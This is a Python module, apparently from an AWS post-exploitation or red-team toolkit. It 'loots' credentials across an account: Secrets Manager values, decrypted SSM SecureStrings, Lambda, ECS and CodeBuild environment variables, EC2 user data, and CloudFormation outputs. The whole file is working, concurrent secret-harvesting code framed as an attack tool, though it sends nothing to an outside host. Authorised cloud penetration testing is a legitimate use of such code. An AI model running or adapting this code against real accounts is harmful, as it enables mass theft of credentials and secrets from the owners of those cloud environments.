"""
Targeted secret and credential extraction.

Reaches into Secrets Manager, SSM Parameter Store, Lambda env vars, EC2 user
data, ECS task definitions, CodeBuild projects, and CloudFormation stacks to
pull anything that looks like a credential or secret value.
"""

import json
import base64
import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import botocore.exceptions


def _serial(obj):
    if isinstance(obj, (datetime.datetime, datetime.date)):
        return obj.isoformat()
    if isinstance(obj, bytes):
        try:
            return obj.decode("utf-8")
        except UnicodeDecodeError:
            return "<binary>"
    return str(obj)


def _safe(data):
    return json.loads(json.dumps(data, default=_serial))


def _try(func, default=None):
    try:
        r = func()
        if isinstance(r, dict):
            r.pop("ResponseMetadata", None)
        return _safe(r)
    except Exception:
        return default


def _loot_secrets_manager(session):
    """Read every secret from Secrets Manager."""
    results = []
    try:
        sm = session.client("secretsmanager")
        paginator = sm.get_paginator("list_secrets")
        for page in paginator.paginate():
            for secret in page.get("SecretList", []):
                sid = secret.get("Name") or secret.get("ARN")
                entry = {
                    "Source": "SecretsManager", "Name": sid,
                    "Description": secret.get("Description"),
                    "LastChanged": secret.get("LastChangedDate"),
                }
                val = _try(lambda: sm.get_secret_value(SecretId=sid))
                if val:
                    entry["SecretString"] = val.get("SecretString")
                    entry["SecretBinary"] = val.get("SecretBinary")
                    entry["Readable"] = True
                else:
                    entry["Readable"] = False
                results.append(entry)
    except Exception:
        pass
    return results


def _loot_ssm(session):
    """Read SSM Parameter Store values, including decrypted SecureStrings."""
    results = []
    try:
        ssm = session.client("ssm")
        paginator = ssm.get_paginator("describe_parameters")
        for page in paginator.paginate():
            for param in page.get("Parameters", []):
                name = param.get("Name")
                entry = {
                    "Source": "SSM", "Name": name,
                    "Type": param.get("Type"),
                    "Description": param.get("Description"),
                    "LastModified": param.get("LastModifiedDate"),
                }
                val = _try(lambda: ssm.get_parameter(Name=name, WithDecryption=True))
                if val and val.get("Parameter"):
                    entry["Value"] = val["Parameter"].get("Value")
                    entry["Readable"] = True
                else:
                    entry["Readable"] = False
                results.append(entry)
    except Exception:
        pass
    return results


def _loot_lambda(session):
    """Extract environment variables from Lambda functions."""
    results = []
    try:
        lmb = session.client("lambda")
        paginator = lmb.get_paginator("list_functions")
        for page in paginator.paginate():
            for fn in page.get("Functions", []):
                env = (fn.get("Environment") or {}).get("Variables", {})
                if env:
                    results.append({
                        "Source": "Lambda", "FunctionName": fn.get("FunctionName"),
                        "Runtime": fn.get("Runtime"), "Variables": env,
                    })
    except Exception:
        pass
    return results


def _loot_ec2_userdata(session):
    """Extract user data scripts from EC2 instances."""
    results = []
    try:
        ec2 = session.client("ec2")
        paginator = ec2.get_paginator("describe_instances")
        for page in paginator.paginate():
            for res in page.get("Reservations", []):
                for inst in res.get("Instances", []):
                    iid = inst.get("InstanceId")
                    try:
                        resp = ec2.describe_instance_attribute(InstanceId=iid, Attribute="userData")
                        ud_val = resp.get("UserData", {}).get("Value")
                        if ud_val:
                            try:
                                decoded = base64.b64decode(ud_val).decode("utf-8", errors="replace")
                            except Exception:
                                decoded = ud_val
                            results.append({
                                "Source": "EC2-UserData", "InstanceId": iid,
                                "State": inst.get("State", {}).get("Name"),
                                "UserData": decoded,
                            })
                    except Exception:
                        continue
    except Exception:
        pass
    return results


def _loot_ecs(session):
    """Extract env vars and secrets from ECS task definitions."""
    results = []
    try:
        ecs = session.client("ecs")
        paginator = ecs.get_paginator("list_task_definitions")
        for page in paginator.paginate():
            for arn in page.get("taskDefinitionArns", [])[:50]:
                try:
                    td = ecs.describe_task_definition(taskDefinition=arn).get("taskDefinition", {})
                    for container in td.get("containerDefinitions", []):
                        env = container.get("environment", [])
                        secrets = container.get("secrets", [])
                        if env or secrets:
                            results.append({
                                "Source": "ECS-TaskDef",
                                "TaskDefinition": arn.split("/")[-1] if "/" in arn else arn,
                                "Container": container.get("name"),
                                "Environment": {e["name"]: e["value"] for e in env},
                                "Secrets": {s["name"]: s["valueFrom"] for s in secrets},
                            })
                except Exception:
                    continue
    except Exception:
        pass
    return results


def _loot_codebuild(session):
    """Extract environment variables from CodeBuild projects."""
    results = []
    try:
        cb = session.client("codebuild")
        projects = cb.list_projects().get("projects", [])
        if projects:
            for i in range(0, len(projects), 100):
                resp = cb.batch_get_projects(names=projects[i:i + 100])
                for proj in resp.get("projects", []):
                    env_vars = proj.get("environment", {}).get("environmentVariables", [])
                    if env_vars:
                        results.append({
                            "Source": "CodeBuild", "ProjectName": proj.get("name"),
                            "Variables": {v["name"]: {"value": v.get("value", ""), "type": v.get("type", "")} for v in env_vars},
                        })
    except Exception:
        pass
    return results


def _loot_cloudformation(session):
    """Extract outputs and parameters from CloudFormation stacks."""
    results = []
    try:
        cfn = session.client("cloudformation")
        paginator = cfn.get_paginator("describe_stacks")
        for page in paginator.paginate():
            for stack in page.get("Stacks", []):
                outputs = stack.get("Outputs", [])
                params = stack.get("Parameters", [])
                if outputs or params:
                    results.append({
                        "Source": "CloudFormation", "StackName": stack.get("StackName"),
                        "Status": stack.get("StackStatus"),
                        "Outputs": {o["OutputKey"]: o.get("OutputValue", "") for o in outputs},
                        "Parameters": {p["ParameterKey"]: p.get("ParameterValue", "") for p in params},
                    })
    except Exception:
        pass
    return results


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------

LOOT_SOURCES = {
    "SecretsManager": _loot_secrets_manager,
    "SSM Parameters": _loot_ssm,
    "Lambda Env Vars": _loot_lambda,
    "EC2 User Data": _loot_ec2_userdata,
    "ECS Task Defs": _loot_ecs,
    "CodeBuild Env": _loot_codebuild,
    "CloudFormation": _loot_cloudformation,
}


def run_loot(session, workers=5, on_result=None):
    """Run all loot extractors concurrently. Returns {source: [items]}."""
    loot = {}
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(func, session): name for name, func in LOOT_SOURCES.items()}
        for f in as_completed(futures):
            name = futures[f]
            try:
                data = f.result()
            except Exception:
                data = []
            loot[name] = data or []
            if on_result:
                on_result(name, len(loot[name]))
    return loot
